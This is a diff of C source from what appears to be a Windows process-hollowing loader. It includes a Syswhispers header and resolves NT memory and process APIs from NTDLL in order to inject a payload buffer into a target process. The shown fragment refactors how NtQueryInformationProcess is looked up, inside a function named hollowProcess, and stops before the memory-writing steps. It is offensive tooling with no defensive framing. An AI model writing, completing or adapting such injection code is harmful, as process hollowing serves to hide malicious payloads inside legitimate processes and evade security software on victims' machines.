@@ -1,32 +1,6 @@
 #include "typedef.h"
 #include "Syswhispers.h"
 
-typedef struct _Syscalls {
-    NtWriteVirtualMemoryPtr myNtWriteVirtualMemory;
-    NtAllocateVirtualMemoryPtr myNtAllocateVirtualMemory;
-    NtProtectVirtualMemoryPtr myNtProtectVirtualMemory;
-    NtQueryProcessInformationPtr myNtQueryProcessInformation;
-    NtReadVirtualMemoryPtr myNtReadVirtualMemory;
-}Syscalls, * PSyscalls;
-
-BOOL populateStruct(OUT PSyscalls syscalls) {
-
-    // HMODULE  = GetModuleHandleA("NTDLL.DLL");
-    HMODULE hNTDLL = LoadLibraryA("NTDLL.DLL");
-    syscalls->myNtWriteVirtualMemory = (NtWriteVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
-    syscalls->myNtAllocateVirtualMemory = (NtAllocateVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
-    syscalls->myNtProtectVirtualMemory = (NtProtectVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
-    syscalls->myNtQueryProcessInformation = (NtQueryProcessInformationPtr)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
-    syscalls->myNtReadVirtualMemory = (NtReadVirtualMemoryPtr)GetProcAddress(hNTDLL, "NtReadVirtualMemory");
-    //NtResumeProcess -> ADD
-    if (syscalls->myNtQueryProcessInformation == NULL || syscalls->myNtAllocateVirtualMemory == NULL || syscalls->myNtProtectVirtualMemory == NULL || syscalls->myNtReadVirtualMemory == NULL || syscalls->myNtWriteVirtualMemory == NULL) {
-        printf("Error populating syscall struct\n");
-        return FALSE;
-    }
-    else {
-        return TRUE;
-    }
-}
 
 void printByteArray(const unsigned char* array, size_t size) {
     printf("Contents of the byte array:\n");
@@ -37,12 +11,8 @@ void printByteArray(const unsigned char* array, size_t size) {
 }
 
 BOOL hollowProcess(PROCESS_INFORMATION Pi, IN PVOID pPayload, SIZE_T sPayload) {
-    Syscalls syscalls = { 0 };
+    
     printf("Size payload: %d\n", sPayload);
-
-    if (!populateStruct(&syscalls)) {
-        return FALSE;
-    }
 
 
     //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
@@ -54,8 +24,9 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, IN PVOID pPayload, SIZE_T sPayload) {
     PROCESS_BASIC_INFORMATION basicInformation = { 0 };
     printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
     //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
-    
-    syscalls.myNtQueryProcessInformation(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+
+    myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
 
 
